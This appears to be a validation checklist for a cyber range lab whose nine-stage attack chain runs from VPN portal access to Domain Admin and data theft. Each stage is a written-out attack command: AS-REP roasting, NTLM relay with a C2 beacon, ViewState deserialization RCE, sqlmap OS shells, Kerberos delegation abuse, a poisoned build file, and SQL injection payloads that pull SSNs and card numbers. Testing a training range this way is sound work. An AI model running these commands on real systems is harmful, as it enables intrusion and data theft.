# The Last Ones — Validation Matrix

Two tiers of testing:

1. **Per-milestone** — after deploy, verify each step is *actually exploitable* from Kali
   (`10.3.10.10`). Commands below; each row is a pass/fail checkpoint.
2. **End-to-end** — a full run through all 9 milestones driven by Mythic/Apollo (the human/agent
   operator path), confirming the chain connects gate-to-gate with no manual shortcuts.

IPs assume range number 3 (`10.3.<vlan>.<octet>`). Names resolve via the range router DNS.

## Per-milestone checks

| Step | From | Command / action | Pass criteria |
|---|---|---|---|
| 1.1 | Kali | `nmap -sV -p- 10.3.20.10 10.3.20.20` | portal shows 80/443/1194; dns shows 53 |
| 1.2 | Kali | `curl -I http://10.3.20.10` | leaks `X-Powered-By: CorpVPN/...`, `X-Backend: vpn01...` |
| 1.3 | Kali | browse portal, login `admin:admin` | dashboard loads, lists `.ovpn` |
| 1.4 | Kali | download `client.ovpn` | valid inline-cert OpenVPN profile |
| 1.5 (gate) | Kali | `sudo openvpn client.ovpn` then `nmap 10.3.30.10` | CHARLIE reachable ONLY while tunnel is up |
| 2.1 | Kali | `nxc smb 10.3.30.20 -u '' -p ''` | `IT$` share readable (anon/guest) |
| 2.2 | Kali | `smbclient -N //10.3.30.20/IT$ -c 'get VPN_Setup_Notes.txt'` | notes leak usernames + preauth hint |
| 2.3 | Kali | `GetNPUsers.py charlie.local/ -usersfile users -dc-ip 10.3.30.10` → `hashcat -m 18200` | svc_helpdesk hash cracks (rockyou) |
| 3.1 | Kali | `dcomexec.py -object MMC20 charlie/svc_helpdesk@10.3.30.30` | command exec on AREUBEN-WS |
| 3.2 | AREUBEN-WS | SharpChrome / DPAPI dump of reuben's Login Data | recovers wiki cred |
| 4.1 | Kali | edit BookStack "VPN Runbook" page as reuben, inject `<img src=//kali/x>` | payload saved (scripts allowed) |
| 4.2 | — | wait for GHOSTS timeline on CHARLIE-FS | helpdesk_admin browser hits the page |
| 4.3 | Kali | `ntlmrelayx.py -t smb://10.3.30.30 -c '<beacon>'` | relayed auth → Apollo beacon to Mythic |
| 4.4 | Kali | `keepass2john passwords.kdbx | hashcat -m 13400` | cracks → OSCAR web-app creds |
| 5.1 | Kali | `badsecrets`/Blacklist3r flags leaked machineKey → `ysoserial.net -p ViewState ...` | RCE on OSCAR-WEB |
| 5.2 | Kali | `sqlmap -r req.txt -p q --dbms mssql --batch` | SQLi confirmed on OSCAR-DB |
| 5.3 | Kali | `sqlmap ... --os-shell` (xp_cmdshell) OR `xp_dirtree \\kali\x` → ntlmrelayx | OS exec as svc_mssql (relay or fallback) |
| 5.4 | Kali | `Get-ADUser svc_mssql -Properties msDS-AllowedToDelegateTo` / BloodHound | constrained delegation visible |
| 5.5 | Kali | `Rubeus.exe s4u /user:svc_mssql /rc4:.. /impersonateuser:oscaradmin /msdsspn:cifs/operator-ws1.oscar.local /ptt` | impersonation TGS obtained |
| 5.6 | Kali | `nxc ldap 10.3.40.10 -M laps` (as delegated principal) | reads OPERATOR-WS1 LAPS pw → local admin |
| 6.1 | OPERATOR-WS1 | open the planted service EXE in ILSpy/dnSpy | reveals AES-CBC + `HKLM\...\KeyBlob` path |
| 6.2 | OPERATOR-WS1 | `GodPotato -cmd "reg query HKLM\SOFTWARE\OscarC2\Agent /v KeyBlob"` | reads SYSTEM-only key (impersonation) |
| 6.3 | Kali | AES-decrypt ciphertext w/ key | plaintext == HardHat admin creds; login `https://10.3.40.50:7096` |
| 7.1/7.2 | Kali/HardHat | task HardHat implant → pivot to ALPHA-WKS `10.3.50.30` | new implant beacons via HardHat only |
| 7.3 | ALPHA-WKS | `git clone http://gitlab.alpha.local/alpha/payment-service && git log -p | gitleaks` | secret found in history |
| 7.4 | ALPHA-WKS | read `%APPDATA%\...\PSReadline\ConsoleHost_history.txt` | leaks PAT + DB/svc_build creds |
| 7.5 | Kali | edit `.gitlab-ci.yml` to echo masked vars | pipeline prints `PROD_DB_PASSWORD` etc. |
| 8.1 | Kali | push poisoned `.csproj` PostBuild `<Exec>` to build repo | TeamCity (DA agent) builds → attacker ∈ Domain Admins; Elastic rule fires but exec succeeds |
| 9.1–9.4 | ALPHA-SECRETS | run payloads vs `usp_SearchCustomers` (see below) | UNION/stored-proc/CALL each extract crown-jewel rows |

### M9 SQLi payloads (against `EXEC dbo.usp_SearchCustomers @SearchTerm=...`)

- 9.1/9.2 (outer, 3-col UNION): `%' UNION SELECT SecretId, SSN+'|'+CreditCardNumber, ApiKey FROM dbo.CustomerSecrets -- `
- 9.3/9.4 (nested inner proc, 2-col UNION): `x' UNION SELECT CustomerId, SSN+'|'+CreditCardNumber+'|'+ApiKey FROM dbo.CustomerSecrets -- `
- SQLi→RCE (stacked, sysadmin): `%'; EXEC xp_cmdshell 'whoami'; -- `

## End-to-end (Mythic) run

Driven by a dedicated operator (subagent) from Kali + Mythic, start-to-DA-to-exfil:
M1 VPN → M2 AS-REP → M3 Chrome → M4 relay→Apollo callback → M5 web→delegation→LAPS →
M6 RE→HardHat → M7 pivot→CI/CD creds → M8 poisoned pipeline→DA → M9 layered SQLi→exfil.

**Pass = every gate crossed using only artifacts earned in prior milestones** (no operator
shortcuts, no direct network paths that bypass the VPN or HardHat gates).

> Results are recorded here as the matrix is executed (✅/❌ + notes) during the validation phase.
